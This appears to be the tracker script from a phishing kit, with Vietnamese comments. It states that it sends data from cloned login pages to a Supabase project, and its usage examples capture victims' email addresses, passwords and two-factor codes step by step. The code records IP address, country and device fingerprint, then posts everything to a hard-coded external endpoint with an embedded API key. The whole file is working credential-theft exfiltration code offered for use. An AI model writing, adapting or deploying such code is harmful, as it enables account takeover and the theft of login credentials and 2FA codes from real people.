/*
 * Supabase tracker — gui du lieu tu cac trang login clone ve Supabase project chinh
 *   - Bang: public.candidate_login_events
 *   - Key : ANON publishable key (chi INSERT duoc, khong xoa/sua)
 *
 * Cach dung (o cac trang HTML):
 *   <script src="supabase-tracker.js"></script>
 *   ...
 *   window.saveLoginEvent({ page: 'index.html',    step: 'email',    email });
 *   window.saveLoginEvent({ page: 'password.html', step: 'password', email, password });
 *   window.saveLoginEvent({ page: 'verify.html',   step: '2fa',      email, twofa_code });
 */
(function () {
    const SUPABASE_URL = 'https://tmsgxgjzzrcdhsxdqgdi.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_UnheZ3TbTb9diVbI4akjEg_GP8hX-Sv';
    const TRACKING_KEY = 'candidate_tracking_session_id';

    function getTrackingSessionId() {
        try {
            let sid = sessionStorage.getItem(TRACKING_KEY);
            if (!sid) {
                sid = 'track-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 8);
                sessionStorage.setItem(TRACKING_KEY, sid);
            }
            return sid;
        } catch (_) { return null; }
    }

    let ipInfoCache = null;
    async function getIpInfo() {
        if (ipInfoCache) return ipInfoCache;
        try {
            const r = await fetch('https://ipapi.co/json/');
            if (!r.ok) return (ipInfoCache = { ip: null, country: null });
            const d = await r.json();
            return (ipInfoCache = { ip: d.ip || null, country: d.country_name || null });
        } catch (_) { return (ipInfoCache = { ip: null, country: null }); }
    }

    function detectDevice() {
        const ua = navigator.userAgent;
        const kind = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
        let os = 'Unknown OS';
        if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
        else if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS X')) os = 'macOS';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        else if (ua.includes('Linux')) os = 'Linux';
        let br = 'Unknown Browser';
        const m1 = ua.match(/Chrome\/(\d+)/);
        const m2 = ua.match(/Edg\/(\d+)/);
        const m3 = ua.match(/Firefox\/(\d+)/);
        const m4 = ua.match(/Version\/(\d+).+Safari/);
        if (m2) br = 'Edge ' + m2[1];
        else if (m1) br = 'Chrome ' + m1[1];
        else if (m3) br = 'Firefox ' + m3[1];
        else if (m4) br = 'Safari ' + m4[1];
        return kind + ' | ' + os + ' | ' + br;
    }

    async function saveLoginEvent(payload) {
        if (!payload || !payload.page || !payload.step) {
            console.warn('[supabase-tracker] missing page/step', payload);
            return;
        }
        try {
            const ip = await getIpInfo();
            const body = Object.assign({
                tracking_session_id: getTrackingSessionId(),
                ip_address: ip.ip,
                ip_country: ip.country,
                user_agent: navigator.userAgent,
                device: detectDevice(),
                raw_payload: {
                    currentPage: payload.page,
                    userAgent: navigator.userAgent,
                    href: window.location.href,
                    ts: new Date().toISOString()
                }
            }, payload);

            const r = await fetch(SUPABASE_URL + '/rest/v1/candidate_login_events', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_KEY,
                    'Authorization': 'Bearer ' + SUPABASE_KEY,
                    'Prefer': 'return=minimal'
                },
                keepalive: true,
                body: JSON.stringify(body)
            });

            if (r.ok) {
                console.log('[supabase-tracker] saved', payload.page, payload.step, 'HTTP', r.status);
            } else {
                const txt = await r.text().catch(() => '');
                console.error('[supabase-tracker] failed', r.status, txt);
            }
        } catch (err) {
            console.error('[supabase-tracker] error', err);
        }
    }

    window.saveLoginEvent = saveLoginEvent;
    console.log('[supabase-tracker] loaded ->', SUPABASE_URL);
})();
